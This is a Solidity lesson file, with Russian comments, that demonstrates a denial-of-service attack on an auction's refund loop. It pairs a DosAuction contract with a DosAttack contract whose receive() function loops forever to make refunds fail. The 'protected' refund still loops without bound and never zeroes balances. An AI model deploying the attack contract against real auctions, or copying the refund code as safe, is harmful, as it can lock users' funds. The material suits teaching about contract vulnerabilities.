// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// denial of service - отказ в обслуживании
contract DosAuction{
    mapping(address => uint) public bidders;
    address[] public allBidders;
    uint public refundProgress; // изначально будет 0

   
    function bid() external payable{
        // Также можно сделать запрет на ставки от смартконтрактов.
        require(msg.sender.code.length == 0, "no calls from smart-contracts"); 
        bidders[msg.sender] += msg.value;
        allBidders.push(msg.sender);
    }

    // через pull, но также нужно предостеречь себя от reentrency и без цикла
    function refund() external{
        for(uint i = refundProgress; i < allBidders.length; i++){
            address bidder = allBidders[i];

            (bool success, ) = bidder.call{value: bidders[bidder]}("");
            if(!success){
                // Вариант - 1.
                // failedRefunds.push(bidder); записываем отдельно тех у кого не прошла транзакция, возможно потом в ручную всё отправлять либо смотреть, что была за ошибка.
            }

            refundProgress++;
        }
    }

    // подход c push. Вариант - 1. Уязвимо для DoS
    // function refund() external{
    //     for(uint i = refundProgress; i < allBidders.length; i++){
    //         address bidder = allBidders[i];

    //         (bool success, ) = bidder.call{value: bidders[bidder]}("");
    //         require(success, "Failed");

    //         refundProgress++;
    //     }
    // }
}

contract DosAttack{
    DosAuction auction;
    bool hack = true;
    address payable owner;

    constructor(address _auction){
        auction = DosAuction(_auction);
        owner = payable(msg.sender);
    }

    function doBid() external payable{
        auction.bid{value: msg.value}();
    }

    function toggleHack() external {
        require(msg.sender == owner, "failed!");

        hack = !hack;
    }

    // то есть выходит так что если мы заходим в функцию refund, и стопоримся на какомто адресе и выходим с success = false, то мы в require просто не сможем пройти, тем самым мы можем двигать прогресс, но до тех пор пока не встанем на каком-то конкретном адресе, если вариант без защиты, то никто не получит свои средства обратно, тк все закончится с ошибкой
    receive() external payable{
        if(hack == true){
            while(true){}
        }else{
            owner.transfer(msg.value); // transfer перевод денежных средств
        }

        // while(true) {  }
        // assert(false); // всегда будет ошибка
    }
}